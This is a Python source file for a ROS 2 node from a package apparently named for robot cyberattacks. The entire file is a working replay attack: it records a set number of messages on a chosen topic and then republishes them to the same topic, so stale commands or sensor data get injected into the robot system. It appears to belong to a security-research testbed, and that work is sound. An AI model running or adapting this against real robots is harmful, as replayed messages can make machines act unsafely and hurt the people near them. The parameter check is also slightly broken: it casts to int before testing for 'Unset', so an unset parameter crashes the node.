import rclpy, sys
from rclpy.node import Node, NodeNameNonExistentError
from rclpy import Parameter
from std_srvs.srv import Empty
from rcl_interfaces.srv import GetParameters
from roboticpark_cyberattacks.utils import rslg, printargs, import_message_type
from rcl_interfaces.srv import *
from std_msgs.msg import String
import random, socket
from ping3 import ping
import concurrent.futures


class replynode(Node):

    replyTopic = None
    replyTopicType = None
    messaggesList = []
    replyAmount = 0
    replied = False

    def __init__(self):
        super().__init__("replynode")
        self.declare_parameter('reply_topic', "Unset")
        self.declare_parameter('reply_topic_type', "Unset")
        self.declare_parameter('reply_amount', "Unset")
        self.replyTopic = self.get_parameter('reply_topic').get_parameter_value().string_value
        replyTopicTypeValue = self.get_parameter('reply_topic_type').get_parameter_value().string_value
        self.replyAmount = int(self.get_parameter('reply_amount').get_parameter_value().string_value)
        printargs(self)

        if self.replyAmount == 'Unset' or self.replyTopic == 'Unset' or replyTopicTypeValue == 'Unset':
            rslg(self,f'No reply_topic or reply_amount passed as parameter')


        self.replyTopicType = import_message_type(self,replyTopicTypeValue)
        self.subscription = self.create_subscription(self.replyTopicType,self.replyTopic,self.save_messagges,10)

        # We reply when needed
        # anything = input('Print anything to start replying the data')
        # self.publishStoredData()

    def save_messagges(self, msg):
        if not len(self.messaggesList) > self.replyAmount:
            rslg(self,f'Mensaje recibido: {msg}')
            self.messaggesList.append(msg)
        else:
            if not self.replied:
                self.replied = True
                rslg(self,f'Replying Data')
                self.publishStoredData()

    def publishStoredData(self):
        self.publisher_ = self.create_publisher(self.replyTopicType, self.replyTopic, 10)
        for i in self.messaggesList:
            rslg(self,f'Publishsing {i}')
            self.publisher_.publish(i)



def main():
    rclpy.init()
    myreplynode = replynode()

    rclpy.spin(myreplynode)



    rclpy.shutdown()